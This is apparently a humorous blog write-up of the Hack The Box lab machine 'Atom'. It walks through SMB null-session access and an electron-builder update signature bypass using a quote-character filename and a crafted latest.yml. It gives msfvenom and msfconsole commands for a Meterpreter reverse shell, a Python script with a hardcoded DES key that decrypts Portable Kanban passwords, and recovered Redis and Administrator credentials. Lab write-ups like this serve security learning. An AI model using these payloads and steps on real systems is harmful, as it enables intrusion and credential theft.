## >> PRAISE THE SUN

>Your Majesty, Your Royal Highnesses, Ladies and Gentlemen, Ghouls and Gremlins.  
There is probably no ~~physicist~~ idiot living today whose name has become so widely known as that of ~~Albert Einstein~~ sp1icer sec. Most discussion centres on his theory of ~~relativity~~ being trash at infosec. This pertains essentially to epistemology and has therefore been the subject of lively debate in philosophical circles. It will be no secret that the famous philosopher Bergson in Paris has challenged this theory, while other philosophers have acclaimed it wholeheartedly. The theory in question also has ~~astrophysical~~ astrocomputer implications which are being rigorously examined at the present time.  
\- sp1icer's version of [Prof. Arrhenius' Nobel speech](https://www.nobelprize.org/prizes/physics/1921/ceremony-speech/)

In case you haven't figured out, today we're ~~performing particle fusion~~ dissecting the [Atom box on HTB](https://app.hackthebox.eu/machines/340)! Welcome back to another post - today's scientific method includes selections from an `electron-builder` exploit, some Portable Kanban magic, and light exploration of Redis. Although it taught some valuable skills, I can see why people gave it a rather low (in my opinion) rating - the initial portion is a bit rough as it requires some blind results and if you're on free servers, a queue. With that out of the way, let's get to it!

## >> SIGNED, YOUR DEAREST MORON

As with all HTB boxes, spawn Atom from the control panel and copy the IP. Once we have that, edit `/etc/hosts` to make our lives lazy-fied and fire off an nmap with `nmap -sCV -O -oA tcp-full -p- -v atom.htb`...

```

Okay, so there's quite a bit to chew on here. 80 and 443 are open for web, 139 and 445 for SMB, Redis on 6379, and even PowerShell remoting on 5985 - sheesh. As with most boxes I start on HTTP and HTTPS since they usually offer the most attack surface. One of the first places I look is in the SSL certificate - sometimes you'll find alternate DNS names in there - but this time we aren't so lucky, so I move on to the actual web site on HTTP. Poking around in there we eventually see a download for a file:

![Finding the Heed application download.](/assets/images/atom/heed_download.png)

Because we're stupid and also greedy, we download the file with reckless abandon. At this point I tried a bit of basic reversing tricks to see what I could find; things like running `strings` and `binwalk` didn't really produce anything of value. I sat here like an idiot for what felt like years...it really couldn't be _this_ hard, could it? Eventually my monke brain came back around to the basics and checked SMB for a null session with `smbclient -L \\atom.htb -U ""` and surprise surprise, we find something interesting...

![Running smbclient with a null session provides us some shares.](/assets/images/atom/smb_null.png)

Aight, so we have a few things in there but the one that catches my eye is `Software_Updates`, since that looks user-generated. Let's connect with `smbclient \\\\atom.htb\\Software_Updates -U ""` and once we're provided with a prompt, snag the interesting file (`UAT_Testing_Procedures.pdf`). As with most things, I ran `strings` and `exifdata` against it, but nothing really showed so let's open it!

![Looking inside the PDF to find a hint.](/assets/images/atom/pdf_contents.png)

Huh, looks like some kind of QA instructional document. This will likely come in handy. Looking at the contents, I immediately picked out that it mentions `electron-builder` which is something I have _absolutely no experience with_. Great, add it to the pile...anyways, ~~here's Wonderwall~~ here's the short form contents:

```
Note taking application built with electron-builder which helps users in taking important
notes.

We follow the below process before releasing our products.
1. Build and install the application to make sure it works as we expect it to be.
2. Make sure that the update server running is in a private hardened instance. To
initiate the QA process, just place the updates in one of the "client" folders, and
the appropriate QA team will test it to ensure it finds an update and installs it
correctly.
3. Follow the checklist to see if all given features are working as expected by the
developer.
```

So we upload _something_ to the client folders under `Software_Updates`. Let's figure out what that something is. To move forward, I Googled "electron-builder exploit" (you know, like a genius) and that [presented me with a wonderful Doyonsec article on an update signature bypass](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html). It won't hurt to take a peek through the article and see what Doyonsec is talking about, though it will be a bit fuzzy if you're not familiar with `electron-builder` (like me). Since we don't currently "get it", let's understand what `electron-builder` is, why it matters what the signature is, and how to set up our own payload. Onwards steed!

![A dog riding a turtle.](/assets/images/atom/steed.gif)

## >> AT YOUR SERVICE M'YAML

Okay, so we have something called `electron-builder` that needs some files. The first thing I tried to do in this scenario was ~~exploit the box blindly~~ _understand and holistically approach the exploitation phase_ - remember kids, understanding the attack is important - and to do that I found [these docs on electron-builder auto-updating applications](https://www.electron.build/auto-update). Specifically it gives us a good amount of information on how to _build_ it into your application but we're not concerned with that - it's already baked in per the QA doc we found. Eventually we find the "Staged Rollouts" section - bingo. This looks familiar to the payload we saw in the Doyonsec article.

```yaml
version: 1.1.0
path: TestApp Setup 1.1.0.exe
sha512: Dj51I0q8aPQ3ioaz9LMqGYujAYRbDNblAQbodDRXAMxmY6hsHqEl3F6SvhfJj5oPhcqdX1ldsgEvfMNXGUXBIw==
stagingPercentage: 10
```

With the difference of the `stagingPercentage` header, we basically see the same file as in the Doyonsec article. The text around it gives some good insight into what's happening:

```
Staged rollouts allow you to distribute the latest version of your app to a subset of users that you can increase over time, similar to rollouts on platforms like Google Play.

Staged rollouts are controlled by manually editing your latest.yml / latest-mac.yml (channel update info file).

Update will be shipped to 10% of userbase.

If you want to pull a staged release because it hasnâ€™t gone well, you must increment the version number higher than your broken release. Because some of your users will be on the broken 1.0.1, releasing a new 1.0.1 would result in them staying on a broken version.
```

So as I understood it, `electron-builder` is a library that will _automatically re-compile your application when presented with a new `latest.yml` file_. That sounds fun and dangerous ðŸ˜ˆ The documentation has a _lot_ more stuff that isn't relevant to us, but I still encourage you to read it - it'll help finish off your understanding of the abilities that `electron-builder` has built-in. Rock on!

Time to bounce back to understanding Doyonsec's article. In it they mention that there's a "Fail Open" flaw in how the underlying Powershell command is handled when taking in a filename that contains a `'` character. [If you're not familiar with Fail Open](https://resources.infosecinstitute.com/topic/fail-open-authentication/), it's a term granted to some sort of check that when failed continues as if nothing wrong occurred. In a lot of cases this is associated with authentication in some format ([think TOTP implementations](https://www.n00py.io/2018/08/bypassing-duo-two-factor-authentication-fail-open/)), but it can be abstracted out to code in general. With that in mind let's re-visit the Powershell command we ultimately end up at when verifying the file signature (taken from Doyonsec's article; seriously, go read it):

```
powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\<USER>\AppData\Roaming\<vulnerable app name>\__update__\<update name>.exe' | ConvertTo-Json -Compress"
```

What's happening is that we put in a filename with `'` in it and cause it to break the `Get-AuthenticodeSignature` call. It looks something like this if we use the name `h'ouse.exe`:

```
powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\sp1icer\AppData\Roaming\heed-v1\__update__\h'ouse.exe | ConvertTo-Json -Compress"
```

Effectively, it ends up at `powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\sp1icer\AppData\Roaming\heed-v1\__update__\h'`. As you can see, that's not a complete command - thus it will fail, but _fail open_. We can then provide any manner of executable to the app and it will accept it as if it was vetted. Woah!

In order to keep the article not-one-million-lines-long, I've decided to skip the PoC portion of the exercise. Let's get directly down and dirty with Metasploit to generate the code and catch shells...

{: .notice--info}
I want to stop here and thank [Pascal_0x90](https://twitter.com/Pascal_0x90) - without a small hint to _also_ generate my payload with the `'` character, I'd have been here staring at my terminal like a friggin moron. Y'know, kind of like normal - just without flags to accompany it. Thanks Pascal!

* Generate a shell: `msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=443 -f exe -o "h'ouse.exe" -e x86/shikata_ga_nai -b '\x00'`
* Get the sha512 of the revshell: `shasum -a 512 "h'ouse.exe"| cut -d " " -f1 | xxd -r -p | base64 -w0`
* Start our listener: `msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 443; run"`
* Start a Python dev server: `python3 -m http.server 80`
* Set up the `latest.yml`: contents below

With that, we're set up - well, except for the `latest.yml`, so let's fix that. Edit a file however you please (I use ~~vi~~ nano) and enter the following contents:

```yaml
version: 1.2.4
path: http://10.10.17.239/h'ouse.exe
sha512: +r+/9b67/pdt/6W2CBu3AWiJqaHVTd0HFe9Ilk4Sh4xJIKxlB4l4DR62/cpRe9N6UoP6VakAi/LN0sOjszILuA==
```

Okay, _NOW_ we're all the way set up. We should have our payload, YAML file, `msfconsole` session, and Python server all ready to rock. All we have to do now is re-connect to the SMB server and drop `latest.yml` into one of the `client_1` folders and then _wait_. And _wait, and wait_. Eventually the server connects to us and drops us a shell as `jason`. Woo!

![Elmo with fire.](/assets/images/atom/fire.gif)

## >> NOTHING PERSONNEL, KID

So we have a user shell, time to get them privs up! I spent _far_ too long looking around in `C:>` for some smoking gun in website configs and other miscellaneous privilege escalation techniques. If you take time and actually poke around in `jason`'s directories, you'll find something strange in `C:\Users\jason\Downloads\>` - it looks like a download of the `Portable Kanban` software. Checking the ~~ancient hacking tomes~~ Google-nator, we find [an exploit for Portable Kanban](https://www.exploit-db.com/exploits/49409). Unfortunately for us, there's only a `pk3.lock` file sitting around so we can't directly use this. If we keep going though, we find something that looks like an encrypted password hanging out in `PortableKanban.cfg`...

![Finding an encrypted password in the PortableKanban.cfg file.](/assets/images/atom/jason_enc_password.png)

With the PK exploit fresh in mind and an encrypted password in hand, I did what any moron would do - [I banged two rocks together](https://www.youtube.com/watch?v=zQGX3J6DAGw)! Or I did the computer equivalent of it, rather - I modified the PK3 retrieval exploit to take an arbitrary file as input rather than a PK3. I figured that there's very little to lose and if it doesn't work, I just go back to the drawing board. Here's what my final `my_decrypt.py` ended up looking like:

```python
#!/usr/bin/env python3

import json
import base64
from des import * #python3 -m pip install des
import sys

try:
        path = sys.argv[1]
except:
        exit("Supply path to PortableKanban.pk3 as argv1")

def decode(hash):
        hash = base64.b64decode(hash.encode('utf-8'))
        key = DesKey(b"7ly6UznJ")
        return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

def main():
        with open(path) as f:
                print("{}".format(decode(f.readline())))

if __name__ == "__main__":
        main()
```

Plug that encrypted password we found into a file for maximum profits. Run it with `python3 my_decrypt.py redis_pw.txt` and lo and behold, a password appears: `kidvscat_yes_kidvscat`. Thinking back to our `nmap`, Powershell remoting _was_ enabled on 5985 - let's try that! _Aaaaaaaaannnnnnddddd.......nothing_. Now that's just rude, not giving us a shell at this point - the password has to go to something else, then. Let's try `redis` with authentication: `redis-cli -h atom.htb -a 'kidvscat_yes_kidvscat'`. Booyakasha, we have a hit!

If you aren't familiar with Redis, [Redis is a caching service that holds many different types of data](https://redis.io/topics/data-types-intro). This has a host of fun things to do - [SSRF over Redis is a fun one](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssrf-talking-to-redis) - but for our purposes, it should be enough to just poke around in the keys _first_, then we can worry about hard things like RCE and SSRF later. Remember to keep it stupid and incrementally build attacks - idiot-proof your exploitation!

![Gordon Ramsay calling a poor chef an "idiot sandwich".](/assets/images/atom/idiot_sandwich.gif)

Again, we've connected with `redis-cli -h atom.htb -a 'kidvscat_yes_kidvscat'` - but what can we do with it? Well, for starters, let's query the keys and see what's currently in the database and then see if we can get values from it...

![Finding an encrypted password in the Redis cache.](/assets/images/atom/redis_cli_admin_acct.png)

Nifty - we found _another_ encrypted password, it looks like. Once again _monke_ brain kicked in and I banged those rocks together so hard they almost broke...._almost_. Gotta save them for another day, you know. Anyways, running our decryption script against the new password hash gets us `kidvscat_admin_@123`. _Ooooooooooh, shiiiiinnnyyy_. Now I hear what you're thinking; it's something like this, isn't it?

![A friend DM'ing me to ask how I knew to do that.](/assets/images/atom/how_did_you_know.png)

To be honest, dear reader, I didn't - I'm just _THAT_ stupid. _C'est la vie_, I guess. Plug that in to `evil-winrm` to receive your hard-earned Administrator shell - _It's your Administrator shell, use it when YOU need it! Call 877-ROOT-NOW, 877-ROOT-NOW!_

![Piece of a JG Wentworth commercial.](/assets/images/atom/jg_wentworth.gif)

## >> ALL HAIL CRYPTOTOAD

[H'okay, so, here's the ~~Earth~~](https://www.youtube.com/watch?v=GtrPMOKkHvM) ending - we've managed to make a valid signature bypass payload and decrypted not one, but _TWO_ encrypted passwords! Overall I understand but don't necessarily agree with the hate for the box - I thought it was a rather neat take on a new-ish exploit and was pleasantly surprised that it was something other than "get a webshell, pivot to user via shared creds, sudo -l ftw". I hope you've enjoyed this post, I learned quite a bit about electron-builder due to it - as always, ~~make sure to like and subscribe~~ like and share on Twitter, keep on keeping on and happy hacking!
